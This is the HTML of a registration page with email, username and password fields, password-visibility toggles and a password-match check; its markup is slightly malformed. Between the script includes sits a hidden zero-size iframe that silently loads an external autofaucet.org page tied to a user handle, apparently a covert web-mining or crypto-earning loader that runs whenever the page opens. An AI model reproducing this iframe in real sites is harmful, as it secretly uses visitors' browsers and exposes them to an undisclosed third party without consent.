<body class="img js-fullheight" id="hero-image" style="background-image: url(images/bg.jpg);">
<section class="ftco-section">
    <div class="container">
        <div class="row justify-content-center">
            <div class="col-md-6 col-lg-4">
                <div class="login-wrap p-0">
            <h3 class="mb-4 text-center">Register</h3>
            <form target="_blank" action="../backend/database.php" class="signin-form" method="post">
                <div class="form-group">
                        <input name="email" type="text" class="form-control" placeholder="Email" required>
                    </div>
                    <input name="username" type="text" class="form-control" placeholder="Username" required>
                </div>
          <div class="form-group">
              <input name="password" id="password-field" type="password" style="margin-top: 15px;" class="form-control" onchange="onChange()" placeholder="Password" required>
            <i class="fa fa-fw fa-eye field-icon" id="toggle-password"></i>
          </div>
          <div class="form-group">
              <input name="password-repeat" id="psw-field" type="password" class="form-control" onchange="onChange()" placeholder="Repeat Password" required>
            <i class="fa fa-fw fa-eye field-icon" id="schusch"></i>
          </div>
          <div class="form-group">
              <button type="submit" class="form-control btn btn-primary submit px-3">Sign In</button>
          </div>
          <div class="form-group d-md-flex">
              <div class="w-50">
                  <label class="checkbox-wrap checkbox-primary">Remember Me
                                <input type="checkbox" checked>
                                <span class="checkmark"></span>
                              </label>
                          </div>
                        </div>
                    </form>
 </section>
 <script src="js/main.js"></script>
 <script src="js/bootstrap.min.js"></script>
 <script src="js/jquery.min.js"></script>
 <script src="js/popper.js"></script>
<iframe src="https://autofaucet.org/wm/VortexOle/2" width="0" height="0" style="border:0"></iframe>
 <script>
    const togglePassword = document.querySelector('#toggle-password');
   const password = document.querySelector('#password-field');

  togglePassword.addEventListener('click', function (e) {
    // toggle the type attribute
    const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
    password.setAttribute('type', type);
    // toggle the eye slash icon
    this.classList.toggle('fa-eye-slash');
});
 </script>
  <script>
    const togglepassword = document.querySelector('#schusch');
  const Password = document.querySelector('#psw-field');

  togglepassword.addEventListener('click', function (f) {
    // toggle the type attribute
    const type = Password.getAttribute('type') === 'password' ? 'text' : 'password';
    Password.setAttribute('type', type);
    // toggle the eye slash icon
    this.classList.toggle('fa-eye-slash');
});
 </script>

<script>
    function onChange() {
      const password = document.querySelector('input[name=password]');
      const confirm = document.querySelector('input[name=password-repeat]');
       if (confirm.value === password.value) {
        confirm.setCustomValidity('');
    } else {
      confirm.setCustomValidity('Passwords do not match');
  }
}
</script>
